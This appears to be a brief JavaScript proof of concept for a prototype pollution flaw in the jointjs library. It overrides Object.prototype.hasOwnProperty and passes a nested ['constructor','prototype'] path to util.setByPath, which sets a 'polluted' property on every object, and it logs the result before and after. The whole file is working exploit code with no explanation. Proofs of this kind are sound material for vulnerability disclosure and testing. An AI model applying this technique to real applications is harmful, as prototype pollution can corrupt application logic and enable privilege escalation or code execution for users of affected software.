Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const jointjs = require('jointjs');
jointjs.util.setByPath({}, [
    [
        'constructor',
        'prototype'
    ],
    'polluted'
], 'yes');
console.log({}.polluted);